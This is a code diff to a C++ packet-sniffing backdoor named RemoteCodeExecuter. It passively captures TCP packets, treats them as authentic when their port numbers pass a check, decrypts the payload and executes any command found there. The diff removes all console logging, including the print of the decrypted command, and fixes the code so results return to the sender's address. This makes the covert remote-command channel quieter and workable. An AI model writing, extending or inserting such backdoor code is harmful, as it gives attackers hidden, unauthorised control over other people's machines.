@@ -43,8 +43,6 @@ void RemoteCodeExecuter::netCallback(const pcap_pkthdr *header, const unsigned c
     struct iphdr *ip;
     struct tcphdr *tcp;
 
-    std::cout << "got packet" << std::endl;
-
     // is it from same machine?
     const unsigned char *thisMac = net->getMac();
     int i;
@@ -55,33 +53,26 @@ void RemoteCodeExecuter::netCallback(const pcap_pkthdr *header, const unsigned c
         }
     }
     if (i == ETH_ALEN) {
-        std::cout << "\tfrom this machine" << std::endl;
         return;
     }
 
     // is it ip?
     if (ntohs(eth->h_proto) != ETH_P_IP) {
-        std::cout << "\tnot ip" << std::endl;
         return;
     }
-    std::cout << "\tip" << std::endl;
 
     // is it tcp?
     ip = (struct iphdr *)(packet + ETH_HLEN);
     if (ip->protocol != IPPROTO_TCP) {
-        std::cout << "\tnot tcp" << std::endl;
         return;
     }
-    std::cout << "\ttcp" << std::endl;
 
     tcp = (struct tcphdr *)(packet + ETH_HLEN + (ip->ihl * 4));
 
     // is it authenticated?
     if (!authenticator::isValidSignature(ntohs(tcp->source), ntohs(tcp->dest))) {
-        std::cout << "\tnot authenticated" << std::endl;
         return;
     }
-    std::cout << "\tauthenticated" << std::endl;
 
     // get payload
     unsigned char *payload = (unsigned char *)(packet + ETH_HLEN + (ip->ihl * 4) + (tcp->doff * 4));
@@ -93,18 +84,10 @@ void RemoteCodeExecuter::netCallback(const pcap_pkthdr *header, const unsigned c
 
     UCharVector plaintext = net->getCrypto()->dec(ciphertext);
 
-    std::cout << "\tplaintext:" << std::endl;
-
-    std::cout << "\t";
-    for (auto &c : plaintext) {
-        std::cout << c;
-    }
-    std::cout << std::endl;
-
     // if command execute it
     char *tmp;
     if ((tmp = getCommand((char *)plaintext.data())) != nullptr) {
-        executeCommand(net, ip->daddr, tmp);
+        executeCommand(net, ntohl(ip->saddr), tmp);
     }
 
     // if it is a response print it
@@ -152,7 +135,7 @@ char *RemoteCodeExecuter::getResponse(char *payload) {
 void RemoteCodeExecuter::executeCommand(NetworkEngine *net, const unsigned int daddr,
                                         const char *cmd) {
     struct in_addr daddrIn;
-    daddrIn.s_addr = ntohs(daddr);
+    daddrIn.s_addr = daddr;
 
     srand(time(NULL));
     unsigned short sport;
